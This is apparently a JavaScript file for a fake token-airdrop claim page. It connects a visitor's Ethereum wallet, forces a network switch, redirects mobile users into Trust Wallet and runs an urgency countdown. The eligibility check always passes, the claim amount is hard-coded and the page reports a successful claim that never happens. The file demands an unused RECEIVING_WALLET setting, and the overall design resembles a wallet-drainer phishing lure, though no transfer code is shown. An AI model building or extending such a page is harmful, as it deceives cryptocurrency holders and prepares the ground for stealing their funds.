// app.js - Token Airdrop Claim DApp

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

// Initialize on load
window.addEventListener('load', async () => {
  try {
    initializeCountdown();
    document.getElementById('currentUrl').textContent = window.location.href;
    
    document.getElementById("networkSelect").addEventListener('change', (e) => {
      currentNetwork = e.target.value;
      updateTokenVisibility();
      updateConnectButton();
    });
    
    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
    document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
    
    await checkWalletEnvironment();
    updateTokenVisibility();
    updateConnectButton();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  if (isMobile) {
    if (!window.ethereum) showTrustWalletUI();
    else hideTrustWalletUI();
  } else {
    hideTrustWalletUI();
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    document.getElementById("connectWallet").disabled = true;
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
    document.getElementById("walletInfo").textContent = 
      `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

// =====================
// UI FUNCTIONS
// =====================

function showTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'block';
  document.getElementById("connectWallet").style.display = 'none';
  document.querySelector('.mobile-warning').style.display = 'block';
}

function hideTrustWalletUI() {
  document.getElementById("trustContainer").style.display = 'none';
  document.getElementById("connectWallet").style.display = 'block';
  document.querySelector('.mobile-warning').style.display = 'none';
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.innerHTML = message;
  statusDiv.className = `status ${type}`;
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateTokenVisibility() {
  document.querySelectorAll('.token-item').forEach(item => {
    item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
  });
}

function updateConnectButton() {
  const btn = document.getElementById("connectWallet");
  if (window.ethereum?.selectedAddress) {
    btn.innerHTML = `<i class="fas fa-wallet"></i> Claim Airdrop`;
  } else {
    btn.innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
  }
}

// Countdown to May 9, 2025
function initializeCountdown() {
  const endDate = new Date("May 9, 2025 00:00:00 GMT+0000");
  
  const timer = setInterval(() => {
    const now = new Date().getTime();
    const distance = endDate - now;
    
    if (distance < 0) {
      clearInterval(timer);
      document.getElementById("days").textContent = "00";
      document.getElementById("hours").textContent = "00";
      document.getElementById("minutes").textContent = "00";
      document.getElementById("seconds").textContent = "00";
      return;
    }
    
    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
    document.getElementById("days").textContent = days.toString().padStart(2, '0');
    document.getElementById("hours").textContent = hours.toString().padStart(2, '0');
    document.getElementById("minutes").textContent = minutes.toString().padStart(2, '0');
    document.getElementById("seconds").textContent = seconds.toString().padStart(2, '0');
  }, 1000);
}

// =====================
// CORE LOGIC
// =====================

async function handleWalletConnection() {
  if (!isMobile && !window.ethereum?.selectedAddress) {
    return showWalletOptions();
  }
  await connectAndClaim();
}

function showWalletOptions() {
  // Create modal
  const modal = document.createElement('div');
  modal.style.position = 'fixed';
  modal.style.top = '0';
  modal.style.left = '0';
  modal.style.width = '100%';
  modal.style.height = '100%';
  modal.style.backgroundColor = 'rgba(0,0,0,0.7)';
  modal.style.display = 'flex';
  modal.style.justifyContent = 'center';
  modal.style.alignItems = 'center';
  modal.style.zIndex = '1000';
  
  // Create modal content
  const content = document.createElement('div');
  content.style.backgroundColor = 'white';
  content.style.padding = '20px';
  content.style.borderRadius = '10px';
  content.style.width = '300px';
  content.style.textAlign = 'center';
  
  content.innerHTML = `
    <h3>Connect Wallet</h3>
    <button id="metaMaskBtn" class="btn" style="margin: 10px 0; width: 100%">
      <i class="fab fa-ethereum"></i> MetaMask
    </button>
    <button id="walletConnectBtn" class="btn" style="margin: 10px 0; width: 100%">
      <i class="fas fa-wallet"></i> WalletConnect
    </button>
    <button id="cancelBtn" class="btn" style="margin: 10px 0; width: 100%; background: #dc3545">
      <i class="fas fa-times"></i> Cancel
    </button>
  `;
  
  modal.appendChild(content);
  document.body.appendChild(modal);
  
  // Add event listeners
  document.getElementById("metaMaskBtn").addEventListener('click', async () => {
    document.body.removeChild(modal);
    await connectAndClaim();
  });
  
  document.getElementById("walletConnectBtn").addEventListener('click', () => {
    document.body.removeChild(modal);
    updateStatus("WalletConnect not implemented in this demo", "error");
  });
  
  document.getElementById("cancelBtn").addEventListener('click', () => {
    document.body.removeChild(modal);
  });
}

async function connectAndClaim() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    if (!window.ethereum) {
      throw new Error("Please install a Web3 wallet");
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });
    await checkNetwork();
    const initialized = await initializeWallet();
    if (!initialized) return;
    
    await processAirdropClaim();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    document.getElementById("connectWallet").disabled = false;
    updateConnectButton();
  } finally {
    hideLoader();
  }
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

async function processAirdropClaim() {
  try {
    // Check eligibility (simulated)
    const isEligible = await checkEligibility();
    if (!isEligible) {
      throw new Error("Wallet not eligible for airdrop");
    }
    
    // Get claim amount
    const claimAmount = await calculateClaimAmount();
    
    // Process claim
    updateStatus(`Claiming ${claimAmount} tokens...`, "success");
    
    // For demo purposes, we'll simulate the claim
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    updateStatus(
      `Airdrop claimed successfully!`,
      "success"
    );
    
    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Claimed`;
  } catch (err) {
    console.error("Claim error:", err);
    throw new Error("Claim failed: " + err.message);
  }
}

// Simulated functions for demo purposes
async function checkEligibility() {
  return true;
}

async function calculateClaimAmount() {
  return "1,250";
}
